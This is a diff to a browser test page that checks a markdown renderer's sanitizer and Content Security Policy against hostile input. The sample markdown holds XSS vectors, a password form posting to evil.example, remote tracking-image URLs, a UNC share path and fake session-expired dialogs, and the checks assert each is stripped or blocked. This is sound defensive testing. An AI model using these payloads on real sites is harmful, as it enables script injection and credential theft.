@@ -11,8 +11,23 @@
     '# Sample document', '', 'Text **bold** [jump](#second-heading)', '',
     '## Second heading', '', '| A | B |', '|---|---|', '| 1 | 2 |', '', '- [x] done', '',
     '<img src="x" onerror="window.__pwned = true">', '<script>window.__pwned = true<\/script>',
-    '[bad](javascript:window.__pwned=true)', '', '## Second heading',
+    '[bad](javascript:window.__pwned=true)', '', '## Second heading', '',
+    '<form action="https://evil.example/f"><input type="password"><button>go</button></form>',
+    '<div style="position:fixed;inset:0">overlay</div>', '',
+    '![t](https://evil.example/t.png)', '<img srcset="https://evil.example/s.png 1x">',
+    '<svg><image href="https://evil.example/i.png"/></svg>', '<video poster="https://evil.example/p.png"></video>', '',
+    '![h](//evil.example/s/p.png)', '<img src="\\\\evil.example\\s\\b.png">',
+    '<table background="//evil.example/s/t.png"><tr><td>t</td></tr></table>', '',
+    '<input type="password" placeholder="pw"> <dialog open>Session expired</dialog>',
+    '<div popover id="pp">pop</div>', '',
+    '[html](evil.html) [md](other.md#x) [web](https://ok.example/) [unc](//evil.example/s/l)',
   ].join('\n');
+  const blocked = [];
+  document.addEventListener('securitypolicyviolation', e => blocked.push(e.blockedURI));
+  lockDown(document);
+  // CSP on its own (no sanitizer): raw remote loads must be refused.
+  const raw = document.createElement('div');
+  raw.innerHTML = '<img src="https://evil.example/raw.png"><video poster="https://evil.example/raw-p.png"></video>';
   const root = document.createElement('div');
   root.innerHTML = renderMarkdown(src);
   addHeadingIds(root);
@@ -27,7 +42,25 @@
     noHandlers: !/onerror/i.test(html),
     noJsLinks: ![...root.querySelectorAll('[href],[src]')].some(e => /^\s*javascript:/i.test(e.getAttribute('href') || e.getAttribute('src'))),
   };
+  checks.noForms = !root.querySelector('form, button');
+  checks.noStyleAttr = !root.querySelector('[style]');
+  // Nothing may point at a file:// URL with a host (Windows network share).
+  checks.noFileHost = ![...root.querySelectorAll('*')].some(e => [...e.attributes].some(a =>
+    /^(href|xlink:href|src|poster|background|srcset)$/.test(a.name) &&
+    (a.name === 'srcset' || a.name === 'background' || (() => { const u = new URL(a.value, location.href); return u.protocol === 'file:' && u.host; })())));
+  checks.onlyCheckboxes = [...root.querySelectorAll('input')].every(i => i.type === 'checkbox' && i.disabled);
+  checks.noPrompts = !root.querySelector('dialog, [popover], [open]');
+  const hrefs = [...root.querySelectorAll('a[href]')].map(a => a.getAttribute('href'));
+  checks.linkPolicy = !hrefs.includes('evil.html') && hrefs.includes('other.md#x') &&
+    hrefs.includes('https://ok.example/') && hrefs.includes('#second-heading');
+  setTimeout(() => {
+  // Remote loads must be refused by the CSP (each shows up as a violation), not just fail.
+  checks.cspBlocks = blocked.filter(u => u.startsWith('https://evil.example/raw')).length === 2;
+  // Sanitizer on its own: no remote URL left on any image/media element.
+  checks.noRemoteSrc = ![...root.querySelectorAll('[src],[poster],image[href]')].some(e =>
+    /^https?:/i.test(e.getAttribute('src') || e.getAttribute('poster') || e.getAttribute('href')));
   const failed = Object.keys(checks).filter(k => !checks[k]);
-  document.getElementById('out').textContent = JSON.stringify(checks);
-  setTimeout(() => { document.title = failed.length || window.__pwned ? 'FAIL ' + failed.join(',') + (window.__pwned ? ' pwned' : '') : 'PASS'; }, 50);
+  document.getElementById('out').textContent = JSON.stringify({ ...checks, blocked });
+  document.title = failed.length || window.__pwned ? 'FAIL ' + failed.join(',') + (window.__pwned ? ' pwned' : '') : 'PASS';
+  }, 300);
 </script>
